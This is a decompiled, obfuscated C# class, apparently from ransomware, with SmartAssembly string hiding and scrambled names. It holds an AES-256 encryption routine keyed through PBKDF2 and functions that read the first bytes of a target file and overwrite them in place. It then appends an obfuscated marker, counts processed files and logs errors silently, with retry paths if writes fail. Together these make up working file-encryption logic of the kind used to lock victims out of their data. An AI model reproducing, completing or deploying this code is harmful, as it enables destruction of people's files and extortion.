using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KNpKkassJHAdE;

public static class nCuLeFOJMwFm
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] lGkbxBLhmdAR(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = swbvwkaARZgysT(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes swbvwkaARZgysT(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] SDNAkiJfsilGu(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (GvesiNnPBqLNWZ.pyThwSTgTjjfN == getString_0(107396949))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (GvesiNnPBqLNWZ.xhPAPGRrPiLSI)
			{
				try
				{
					File.AppendAllText(GvesiNnPBqLNWZ.YnUuGHOKmtC, getString_0(107349399) + string_0 + getString_0(107460862) + ex.Message + getString_0(107397144));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool qPbWhlKhAppzNfg(string pKaaTBGJXvm, byte[] iDrQCKghbyOmD, byte[] zLzjQSIBEPplj = null)
	{
		try
		{
			byte[] array = null;
			if (GvesiNnPBqLNWZ.pyThwSTgTjjfN == getString_0(107396949))
			{
				array = (GvesiNnPBqLNWZ.mAogUeKgKjciiQM ? Encoding.ASCII.GetBytes(GvesiNnPBqLNWZ.PezUDwzFibxi(GvesiNnPBqLNWZ.wwdbwPvQwNQjO) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460804)) + Convert.ToString(GvesiNnPBqLNWZ.yYEzOFFalxHtfd) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460804))) : Encoding.ASCII.GetBytes(GvesiNnPBqLNWZ.PezUDwzFibxi(GvesiNnPBqLNWZ.wwdbwPvQwNQjO) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460845)) + Convert.ToString(GvesiNnPBqLNWZ.yYEzOFFalxHtfd) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460845))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(pKaaTBGJXvm, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(iDrQCKghbyOmD, 0, iDrQCKghbyOmD.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(pKaaTBGJXvm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GvesiNnPBqLNWZ.mAogUeKgKjciiQM)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(zLzjQSIBEPplj, 0, zLzjQSIBEPplj.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (GvesiNnPBqLNWZ.mAogUeKgKjciiQM ? Encoding.ASCII.GetBytes(GvesiNnPBqLNWZ.PezUDwzFibxi(GvesiNnPBqLNWZ.wwdbwPvQwNQjO) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460804)) + Convert.ToString(GvesiNnPBqLNWZ.yYEzOFFalxHtfd) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460804))) : Encoding.ASCII.GetBytes(GvesiNnPBqLNWZ.PezUDwzFibxi(GvesiNnPBqLNWZ.wwdbwPvQwNQjO) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460845)) + Convert.ToString(GvesiNnPBqLNWZ.yYEzOFFalxHtfd) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460845))));
				FileStream fileStream2 = new FileStream(pKaaTBGJXvm, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(iDrQCKghbyOmD, 0, iDrQCKghbyOmD.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(pKaaTBGJXvm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GvesiNnPBqLNWZ.mAogUeKgKjciiQM)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(zLzjQSIBEPplj, 0, zLzjQSIBEPplj.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			GvesiNnPBqLNWZ.nYFqJsGRovRB++;
		}
		catch (Exception ex)
		{
			if (GvesiNnPBqLNWZ.xhPAPGRrPiLSI)
			{
				try
				{
					File.AppendAllText(GvesiNnPBqLNWZ.YnUuGHOKmtC, getString_0(107349399) + pKaaTBGJXvm + getString_0(107460827) + ex.Message + getString_0(107397144));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (GvesiNnPBqLNWZ.mAogUeKgKjciiQM ? Encoding.ASCII.GetBytes(GvesiNnPBqLNWZ.PezUDwzFibxi(GvesiNnPBqLNWZ.wwdbwPvQwNQjO) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460804)) + Convert.ToString(GvesiNnPBqLNWZ.yYEzOFFalxHtfd) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460804))) : Encoding.ASCII.GetBytes(GvesiNnPBqLNWZ.PezUDwzFibxi(GvesiNnPBqLNWZ.wwdbwPvQwNQjO) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460845)) + Convert.ToString(GvesiNnPBqLNWZ.yYEzOFFalxHtfd) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460845))));
				FileStream fileStream4 = new FileStream(pKaaTBGJXvm, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(iDrQCKghbyOmD, 0, iDrQCKghbyOmD.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(pKaaTBGJXvm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!GvesiNnPBqLNWZ.mAogUeKgKjciiQM)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(zLzjQSIBEPplj, 0, zLzjQSIBEPplj.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static nCuLeFOJMwFm()
	{
		Strings.CreateGetStringDelegate(typeof(nCuLeFOJMwFm));
	}
}
